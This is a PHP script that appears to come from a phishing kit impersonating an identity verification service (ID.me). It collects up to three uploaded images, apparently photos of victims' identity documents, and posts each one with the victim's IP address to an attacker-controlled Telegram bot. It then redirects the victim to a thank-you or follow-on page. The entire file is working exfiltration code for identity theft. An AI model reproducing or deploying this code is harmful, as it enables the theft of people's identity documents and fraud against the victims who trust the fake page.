<?php
session_start();
error_reporting(0);
# Adding Settings 
include('function.php');
include('../config.php');

$botToken = $settings['bot_url']; 
$chatId = $settings['chat_id'];
$mmmmm = '🔥== CLOUDWORKERS ID FROM {'.$IP.'} ==✅';

// Loop through uploaded files
for ($i = 1; $i <= 3; $i++) {
  $fileKey = "image" . $i;

  if (isset($_FILES[$fileKey]) && $_FILES[$fileKey]['error'] === UPLOAD_ERR_OK) {
      $imagePath = $_FILES[$fileKey]['tmp_name'];

      // Send image to Telegram
      $url = "https://api.telegram.org/bot$botToken/sendPhoto";
      $postFields = [
          'chat_id' => $chatId,
          'caption' => $mmmmm,
          'photo' => new CURLFile($imagePath, 'image/jpeg', $fileKey),
      ];

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

      $response = curl_exec($ch);

      if (curl_errno($ch)) {
          echo 'Curl error: ' . curl_error($ch);
      }

      curl_close($ch);

      // Handle the response (you can customize this part based on your needs)
      $responseData = json_decode($response, true);

  }
}

sleep(6);
if ($settings['idme_page'] == "1"){
    header('Location: ../link.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redir');
    }else{
      header('Location: ../ThankYou.php?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redir');
    }
?>